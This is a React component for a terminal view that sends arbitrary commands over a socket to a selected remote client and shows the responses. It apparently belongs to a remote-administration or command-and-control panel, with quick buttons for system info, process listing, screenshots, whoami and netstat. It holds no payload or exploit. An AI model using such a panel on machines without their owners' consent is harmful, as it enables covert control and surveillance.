import React, { useState, useEffect, useRef } from 'react';
import styled from 'styled-components';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';
import { 
  FiTerminal, 
  FiSend, 
  FiTrash2, 
  FiDownload,
  FiUpload,
  FiCopy,
  FiMaximize2,
  FiMinimize2
} from 'react-icons/fi';
import { toast } from 'react-toastify';

const TerminalContainer = styled.div`
  background: #0a0a0a;
  border-radius: 12px;
  border: 1px solid #333;
  height: calc(100vh - 140px);
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const TerminalHeader = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 12px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const HeaderLeft = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
`;

const TerminalIcon = styled.div`
  width: 32px;
  height: 32px;
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border-radius: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #000;
  font-size: 16px;
`;

const ClientInfo = styled.div`
  .client-name {
    font-weight: 600;
    color: #fff;
    font-size: 14px;
  }
  
  .client-ip {
    color: #888;
    font-size: 12px;
  }
`;

const HeaderRight = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;
`;

const HeaderButton = styled.button`
  background: rgba(255, 255, 255, 0.1);
  border: 1px solid #333;
  color: #ccc;
  padding: 6px 12px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  transition: all 0.2s;

  &:hover {
    background: rgba(255, 255, 255, 0.2);
    color: #fff;
  }
`;

const TerminalBody = styled.div`
  flex: 1;
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const OutputArea = styled.div`
  flex: 1;
  padding: 20px;
  overflow-y: auto;
  background: #0a0a0a;
  font-family: 'Courier New', monospace;
  font-size: 14px;
  line-height: 1.5;
`;

const OutputLine = styled.div`
  margin-bottom: 8px;
  display: flex;
  align-items: flex-start;
  gap: 12px;
  
  &.command {
    color: #00ff88;
    
    &::before {
      content: '> ';
      color: #666;
    }
  }
  
  &.response {
    color: #ccc;
    white-space: pre-wrap;
    word-break: break-word;
  }
  
  &.error {
    color: #ff6b6b;
  }
  
  &.info {
    color: #4dabf7;
  }
`;

const Timestamp = styled.span`
  color: #666;
  font-size: 12px;
  min-width: 80px;
  flex-shrink: 0;
`;

const InputArea = styled.div`
  background: #1a1a1a;
  border-top: 1px solid #333;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  gap: 12px;
`;

const CommandInput = styled.input`
  flex: 1;
  background: #0a0a0a;
  border: 1px solid #333;
  color: #fff;
  padding: 12px 16px;
  border-radius: 8px;
  font-family: 'Courier New', monospace;
  font-size: 14px;
  outline: none;
  transition: border-color 0.2s;

  &:focus {
    border-color: #00ff88;
  }

  &::placeholder {
    color: #666;
  }
`;

const SendButton = styled.button`
  background: linear-gradient(135deg, #00ff88, #00cc6a);
  border: none;
  color: #000;
  padding: 12px 20px;
  border-radius: 8px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 600;
  transition: all 0.2s;

  &:hover {
    transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(0, 255, 136, 0.3);
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
    transform: none;
  }
`;

const QuickCommands = styled.div`
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin-bottom: 16px;
`;

const QuickCommandButton = styled.button`
  background: rgba(0, 255, 136, 0.1);
  border: 1px solid #00ff88;
  color: #00ff88;
  padding: 6px 12px;
  border-radius: 6px;
  font-size: 12px;
  cursor: pointer;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.2);
  }
`;

const Terminal = ({ client, socket }) => {
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState([]);
  const [isConnected, setIsConnected] = useState(false);
  const outputRef = useRef(null);
  const inputRef = useRef(null);

  const quickCommands = [
    'sysinfo',
    'processes',
    'services',
    'network',
    'screenshot',
    'dir',
    'whoami',
    'ipconfig',
    'tasklist',
    'netstat -an'
  ];

  useEffect(() => {
    if (!socket || !client) return;

    const handleCommandResponse = (data) => {
      if (data.clientId === client.id) {
        setOutput(prev => [...prev, {
          type: 'response',
          content: data.response,
          timestamp: new Date()
        }]);
      }
    };

    const handleCommandSent = (data) => {
      if (data.clientId === client.id) {
        setOutput(prev => [...prev, {
          type: 'command',
          content: data.command,
          timestamp: new Date()
        }]);
      }
    };

    const handleCommandError = (error) => {
      setOutput(prev => [...prev, {
        type: 'error',
        content: `Error: ${error.error}`,
        timestamp: new Date()
      }]);
    };

    socket.on('commandResponse', handleCommandResponse);
    socket.on('commandSent', handleCommandSent);
    socket.on('commandError', handleCommandError);

    setIsConnected(true);

    return () => {
      socket.off('commandResponse', handleCommandResponse);
      socket.off('commandSent', handleCommandSent);
      socket.off('commandError', handleCommandError);
    };
  }, [socket, client]);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  const handleSendCommand = () => {
    if (!command.trim() || !socket || !client) return;

    socket.emit('executeCommand', {
      clientId: client.id,
      command: command.trim()
    });

    setCommand('');
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleSendCommand();
    }
  };

  const handleQuickCommand = (cmd) => {
    setCommand(cmd);
    if (inputRef.current) {
      inputRef.current.focus();
    }
  };

  const clearOutput = () => {
    setOutput([]);
  };

  const copyOutput = () => {
    const text = output.map(line => 
      `[${line.timestamp.toLocaleTimeString()}] ${line.type === 'command' ? '>' : ''} ${line.content}`
    ).join('\n');
    
    navigator.clipboard.writeText(text);
    toast.success('Output copied to clipboard');
  };

  if (!client) {
    return (
      <TerminalContainer>
        <div style={{ 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center', 
          height: '100%',
          color: '#666',
          fontSize: '16px'
        }}>
          Select a client to start terminal session
        </div>
      </TerminalContainer>
    );
  }

  return (
    <TerminalContainer>
      <TerminalHeader>
        <HeaderLeft>
          <TerminalIcon>
            <FiTerminal />
          </TerminalIcon>
          <ClientInfo>
            <div className="client-name">{client.hostname}</div>
            <div className="client-ip">{client.ip}</div>
          </ClientInfo>
        </HeaderLeft>
        
        <HeaderRight>
          <HeaderButton onClick={copyOutput}>
            <FiCopy />
            Copy
          </HeaderButton>
          <HeaderButton onClick={clearOutput}>
            <FiTrash2 />
            Clear
          </HeaderButton>
        </HeaderRight>
      </TerminalHeader>

      <TerminalBody>
        <QuickCommands>
          {quickCommands.map((cmd, index) => (
            <QuickCommandButton
              key={index}
              onClick={() => handleQuickCommand(cmd)}
            >
              {cmd}
            </QuickCommandButton>
          ))}
        </QuickCommands>

        <OutputArea ref={outputRef}>
          {output.length === 0 ? (
            <div style={{ color: '#666', fontStyle: 'italic' }}>
              Terminal ready. Type a command or select from quick commands above.
            </div>
          ) : (
            output.map((line, index) => (
              <OutputLine key={index} className={line.type}>
                <Timestamp>
                  {line.timestamp.toLocaleTimeString()}
                </Timestamp>
                <div>{line.content}</div>
              </OutputLine>
            ))
          )}
        </OutputArea>

        <InputArea>
          <CommandInput
            ref={inputRef}
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyPress={handleKeyPress}
            placeholder="Enter command..."
            disabled={!isConnected}
          />
          <SendButton
            onClick={handleSendCommand}
            disabled={!command.trim() || !isConnected}
          >
            <FiSend />
            Send
          </SendButton>
        </InputArea>
      </TerminalBody>
    </TerminalContainer>
  );
};

export default Terminal;
